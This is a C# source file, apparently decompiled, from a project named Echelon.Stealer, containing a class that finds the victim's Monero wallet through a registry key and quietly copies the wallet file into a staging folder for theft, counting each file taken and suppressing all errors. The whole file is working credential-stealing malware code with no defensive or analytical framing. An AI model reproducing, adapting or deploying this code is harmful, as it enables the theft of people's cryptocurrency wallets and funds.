using System;
using System.IO;
using Microsoft.Win32;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x0200000E RID: 14
	internal class Monero
	{
		// Token: 0x06000021 RID: 33 RVA: 0x00003754 File Offset: 0x00001954
		public static void XMRcoinStr(string directorypath)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
				{
					try
					{
						Directory.CreateDirectory(directorypath + Monero.base64xmr);
						string text = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
						Directory.CreateDirectory(directorypath + Monero.base64xmr);
						File.Copy(text, directorypath + Monero.base64xmr + text.Split(new char[]
						{
							'\\'
						})[text.Split(new char[]
						{
							'\\'
						}).Length - 1]);
						Monero.count++;
						Wallets.count++;
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000022 RID: 34
		public static int count;

		// Token: 0x04000023 RID: 35
		public static string base64xmr = "\\Wallets\\Monero\\";
	}
}
